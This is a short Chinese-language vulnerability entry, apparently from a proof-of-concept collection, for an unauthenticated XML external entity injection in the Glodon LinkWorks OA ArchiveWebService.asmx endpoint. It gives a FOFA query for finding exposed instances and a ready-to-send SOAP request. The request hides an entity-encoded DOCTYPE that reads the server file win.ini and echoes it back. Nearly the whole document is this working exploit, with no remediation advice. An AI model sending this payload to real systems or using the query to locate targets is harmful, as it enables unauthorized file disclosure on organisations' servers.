# 广联达OA接口ArchiveWebService存在XML实体注入漏洞

广联达 LinkWorks /GB/LK/Document/ArchiveService/ArchiveWebService.asmx接口处存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。

## fofa

```yaml
body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

```yaml
POST /GB/LK/Document/ArchiveService/ArchiveWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <PostArchiveInfo xmlns="http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx">
      <archiveInfo>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x20;&#x5b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x73;&#x2f;&#x77;&#x69;&#x6e;&#x2e;&#x69;&#x6e;&#x69;&#x22;&#x3e;&#x0a;&#x5d;&#x3e;&#x0a;&#x0a;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#x0a;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x0a;&#x0a;&#x0a;&#x26;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x3b;&#x0a;&#x0a;&#x0a;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x0a;&#x3c;&#x2f;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x44;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x20;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3c;&#x2f;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x31;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x31;&#x2e;&#x30;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;</archiveInfo>
      <folderIdList>string</folderIdList>
      <platId>string</platId>
    </PostArchiveInfo>
  </soap:Body>
</soap:Envelope>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407181247294.png)